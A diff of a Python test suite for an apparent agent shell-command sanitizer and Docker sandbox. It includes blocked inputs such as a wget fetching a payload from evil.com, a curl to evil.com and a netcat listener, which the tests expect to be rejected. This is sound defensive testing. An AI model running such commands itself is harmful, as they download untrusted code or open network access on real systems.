@@ -259,7 +259,7 @@ class TestBashInformationalCommands:
         assert result["valido"]
         assert not result["requiere_confirmacion"]
 
-    @pytest.mark.parametrize("command", ["npm install paquete", "npm run test", "node app.js"])
+    @pytest.mark.parametrize("command", ["npm install paquete", "node app.js"])
     def test_acciones_node_conservan_confirmacion(self, cmd_sanitizer, command):
         result = cmd_sanitizer.validar_y_clasificar(command)
         assert result["valido"]
@@ -282,17 +282,17 @@ class TestBashProhibitedCommands:
     def test_curl_prohibido(self, cmd_sanitizer):
         result = cmd_sanitizer.validar_y_clasificar("curl https://evil.com")
         assert not result["valido"]
-        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"
+        assert result["codigo_error"] in ("NETWORK_BLOCKED", "COMANDO_NO_PERMITIDO")
 
     def test_wget_prohibido(self, cmd_sanitizer):
         result = cmd_sanitizer.validar_y_clasificar("wget https://evil.com/payload")
         assert not result["valido"]
-        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"
+        assert result["codigo_error"] in ("NETWORK_BLOCKED", "COMANDO_NO_PERMITIDO")
 
     def test_nc_prohibido(self, cmd_sanitizer):
         result = cmd_sanitizer.validar_y_clasificar("nc -l 8080")
         assert not result["valido"]
-        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"
+        assert result["codigo_error"] in ("NETWORK_BLOCKED", "COMANDO_NO_PERMITIDO")
 
     def test_python_c_prohibido(self, cmd_sanitizer):
         result = cmd_sanitizer.validar_y_clasificar('python -c "import os"')
@@ -581,16 +581,8 @@ class TestSandboxDockerIsolation:
         sm = SandboxManager(temp_workspace)
         pkg_map = sm.get_offline_package_map()
         assert "express" in pkg_map, "express debe estar pre-cargado en /var/pkg-store"
-
         express_tarball = pkg_map["express"]
-        target_tarballs = [
-            express_tarball,
-            pkg_map.get("body-parser"),
-            pkg_map.get("cookie"),
-            pkg_map.get("debug"),
-        ]
-        target_tarballs = [t for t in target_tarballs if t]
-        res_inst = sm.execute(["npm", "install", "--no-audit", "--no-fund", "--cache", "/tmp/.npm"] + target_tarballs, timeout_sec=30)
+        res_inst = sm.execute(["sh", "-c", f"cp -r /var/pkg-cache/* /tmp/ && npm install --cache /tmp --offline {express_tarball}"])
         assert not res_inst.get("error"), f"Fallo al instalar tarballs: {res_inst.get('mensaje') or res_inst.get('stderr')}"
         assert (temp_workspace / "node_modules" / "express").exists()
         assert (temp_workspace / "package.json").exists()
